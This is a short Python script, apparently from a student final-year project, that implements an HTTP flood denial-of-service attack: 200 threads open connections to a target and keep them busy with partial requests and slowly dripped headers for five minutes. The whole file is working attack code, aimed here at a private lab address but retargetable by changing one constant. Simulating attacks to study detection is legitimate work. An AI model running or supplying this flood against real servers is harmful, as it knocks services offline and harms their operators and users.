#!/usr/bin/env python3
"""
http_flood.py - Simple HTTP flood attack for FYP simulation
Opens many slow HTTP connections to overload the server.
"""

import socket
import threading
import time
import random

TARGET_IP = "10.0.0.1"
TARGET_PORT = 80
NUM_THREADS = 200       # number of attacking connections
DURATION_SECONDS = 300  # 5 minutes


def http_flood():
    """One attacker thread sending slow HTTP requests."""
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((TARGET_IP, TARGET_PORT))

            # Send a partial HTTP request to keep connection open
            user_agent = f"Mozilla/5.0 (X{random.randint(0, 9999)})"
            request = (
                f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n"
                f"Host: {TARGET_IP}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Accept-language: en-US,en,q=0.5\r\n"
            )
            sock.send(request.encode())

            # Keep sending headers slowly to keep connection alive
            for _ in range(10):
                sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                time.sleep(0.5)

            sock.close()
        except Exception:
            pass


def main():
    print(f"[http_flood] Starting HTTP flood on {TARGET_IP}:{TARGET_PORT}")
    print(f"[http_flood] {NUM_THREADS} threads, {DURATION_SECONDS}s")

    start_time = time.time()
    threads = []
    for i in range(NUM_THREADS):
        t = threading.Thread(target=http_flood, daemon=True)
        t.start()
        threads.append(t)
        if i % 20 == 0:
            print(f"[http_flood] {i + 1} attacker threads started")

    # Run for the duration
    while time.time() - start_time < DURATION_SECONDS:
        time.sleep(1)
        elapsed = int(time.time() - start_time)
        if elapsed % 30 == 0:
            print(f"[http_flood] Attack running... {elapsed}s elapsed")

    print("[http_flood] DONE")


if __name__ == "__main__":
    main()
